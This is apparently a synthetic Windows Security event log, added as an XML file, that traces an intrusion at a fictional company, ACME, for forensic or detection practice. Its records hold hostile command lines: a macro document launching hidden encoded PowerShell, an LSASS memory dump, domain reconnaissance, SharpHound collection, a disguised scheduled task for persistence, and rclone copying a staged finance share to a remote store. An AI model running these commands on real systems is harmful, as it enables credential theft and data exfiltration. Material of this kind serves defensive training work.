@@ -1,0 +1,417 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4624</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:02:11.000000000Z"/>
+    <EventRecordID>1001</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-0-0</Data>
+    <Data Name="TargetUserName">jsmith</Data>
+    <Data Name="TargetDomainName">ACME</Data>
+    <Data Name="TargetUserSid">S-1-5-21-3847294821-1073842346-2892847613-1104</Data>
+    <Data Name="LogonType">2</Data>
+    <Data Name="IpAddress">-</Data>
+    <Data Name="IpPort">-</Data>
+    <Data Name="ProcessName">C:\Windows\System32\winlogon.exe</Data>
+    <Data Name="LogonProcessName">User32</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:47:03.000000000Z"/>
+    <EventRecordID>1002</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+    <Data Name="CommandLine">&quot;C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE&quot; &quot;C:\Users\jsmith\Downloads\Invoice_March2024.docm&quot;</Data>
+    <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:47:45.000000000Z"/>
+    <EventRecordID>1003</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="CommandLine">cmd.exe /c powershell.exe -nop -w hidden -EncodedCommand BASE64ENCODED</Data>
+    <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:47:52.000000000Z"/>
+    <EventRecordID>1004</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -nop -w hidden -EncodedCommand BASE64ENCODED</Data>
+    <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:48:10.000000000Z"/>
+    <EventRecordID>1005</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+    <Data Name="CommandLine">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe -install</Data>
+    <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:52:04.000000000Z"/>
+    <EventRecordID>1006</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Users\jsmith\AppData\Local\Temp\pd.exe</Data>
+    <Data Name="CommandLine">pd.exe -accepteula -ma lsass.exe C:\Users\jsmith\AppData\Local\Temp\lsass.dmp</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4656</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:52:30.000000000Z"/>
+    <EventRecordID>1007</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="ObjectName">\Device\HarddiskVolume3\Windows\System32\lsass.exe</Data>
+    <Data Name="ObjectType">Process</Data>
+    <Data Name="AccessMask">0x1410</Data>
+    <Data Name="ProcessName">C:\Users\jsmith\AppData\Local\Temp\pd.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:55:00.000000000Z"/>
+    <EventRecordID>1008</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Windows\System32\net.exe</Data>
+    <Data Name="CommandLine">net.exe group &quot;Domain Admins&quot; /domain</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:55:08.000000000Z"/>
+    <EventRecordID>1009</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Windows\System32\net.exe</Data>
+    <Data Name="CommandLine">net.exe user /domain</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:55:18.000000000Z"/>
+    <EventRecordID>1010</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Windows\System32\nltest.exe</Data>
+    <Data Name="CommandLine">nltest.exe /domain_trusts /all_trusts</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T16:55:25.000000000Z"/>
+    <EventRecordID>1011</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Windows\System32\nltest.exe</Data>
+    <Data Name="CommandLine">nltest.exe /dclist:ACME.LOCAL</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:03:12.000000000Z"/>
+    <EventRecordID>1012</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Users\jsmith\AppData\Local\Temp\SharpHound.exe</Data>
+    <Data Name="CommandLine">SharpHound.exe -c All --domain ACME.LOCAL --zipfilename bloodhound_acme.zip</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4648</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:15:33.000000000Z"/>
+    <EventRecordID>1013</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="TargetUserName">svc_backup</Data>
+    <Data Name="TargetDomainName">ACME</Data>
+    <Data Name="TargetServerName">SRV-FILE01</Data>
+    <Data Name="ProcessName">C:\Windows\System32\mstsc.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4624</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:16:02.000000000Z"/>
+    <EventRecordID>1014</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserSid">S-1-0-0</Data>
+    <Data Name="TargetUserName">svc_backup</Data>
+    <Data Name="TargetDomainName">ACME</Data>
+    <Data Name="TargetUserSid">S-1-5-21-3847294821-1073842346-2892847613-500</Data>
+    <Data Name="LogonType">3</Data>
+    <Data Name="IpAddress">10.10.1.55</Data>
+    <Data Name="IpPort">49823</Data>
+    <Data Name="ProcessName">-</Data>
+    <Data Name="LogonProcessName">NtLmSsp</Data>
+    <Data Name="WorkstationName">DESKTOP-W7K2MNX</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4698</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:22:05.000000000Z"/>
+    <EventRecordID>1015</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="TaskName">\Microsoft\Windows\UpdateCheck\WinUpdateSvc</Data>
+    <Data Name="TaskContent">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;C:\Users\jsmith\AppData\Roaming\WinUpdateSvc.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:35:18.000000000Z"/>
+    <EventRecordID>1016</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Windows\System32\robocopy.exe</Data>
+    <Data Name="CommandLine">robocopy.exe \\SRV-FILE01\Finance C:\Users\jsmith\AppData\Local\Temp\staging /E /COPYALL</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:41:07.000000000Z"/>
+    <EventRecordID>1017</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">jsmith</Data>
+    <Data Name="SubjectDomainName">ACME</Data>
+    <Data Name="NewProcessName">C:\Users\jsmith\AppData\Local\Temp\rclone.exe</Data>
+    <Data Name="CommandLine">rclone.exe copy C:\Users\jsmith\AppData\Local\Temp\staging remote:acme-backup --config C:\Users\jsmith\AppData\Local\Temp\rclone.conf</Data>
+    <Data Name="ParentProcessName">C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:45:00.000000000Z"/>
+    <EventRecordID>1018</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="TargetDomainName">.</Data>
+    <Data Name="FailureReason">%%2313</Data>
+    <Data Name="Status">0xC000006D</Data>
+    <Data Name="SubStatus">0xC0000064</Data>
+    <Data Name="IpAddress">10.10.1.20</Data>
+    <Data Name="LogonType">3</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:45:03.000000000Z"/>
+    <EventRecordID>1019</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="TargetDomainName">.</Data>
+    <Data Name="FailureReason">%%2313</Data>
+    <Data Name="Status">0xC000006D</Data>
+    <Data Name="SubStatus">0xC0000064</Data>
+    <Data Name="IpAddress">10.10.1.21</Data>
+    <Data Name="LogonType">3</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:45:06.000000000Z"/>
+    <EventRecordID>1020</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="TargetDomainName">.</Data>
+    <Data Name="FailureReason">%%2313</Data>
+    <Data Name="Status">0xC000006D</Data>
+    <Data Name="SubStatus">0xC0000064</Data>
+    <Data Name="IpAddress">10.10.1.22</Data>
+    <Data Name="LogonType">3</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2024-03-15T17:45:09.000000000Z"/>
+    <EventRecordID>1021</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">Administrator</Data>
+    <Data Name="TargetDomainName">.</Data>
+    <Data Name="FailureReason">%%2313</Data>
+    <Data Name="Status">0xC000006D</Data>
+    <Data Name="SubStatus">0xC0000064</Data>
+    <Data Name="IpAddress">10.10.1.23</Data>
+    <Data Name="LogonType">3</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>1116</EventID>
+    <Level>3</Level>
+    <TimeCreated SystemTime="2024-03-15T18:02:44.000000000Z"/>
+    <EventRecordID>1022</EventRecordID>
+    <Channel>Security</Channel>
+    <Computer>DESKTOP-W7K2MNX</Computer>
+  </System>
+  <EventData>
+    <Data Name="SubjectUserName">SYSTEM</Data>
+    <Data Name="SubjectDomainName">NT AUTHORITY</Data>
+    <Data Name="NewProcessName">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\MsMpEng.exe</Data>
+    <Data Name="CommandLine"></Data>
+    <Data Name="ParentProcessName"></Data>
+  </EventData>
+</Event>
+</Events>
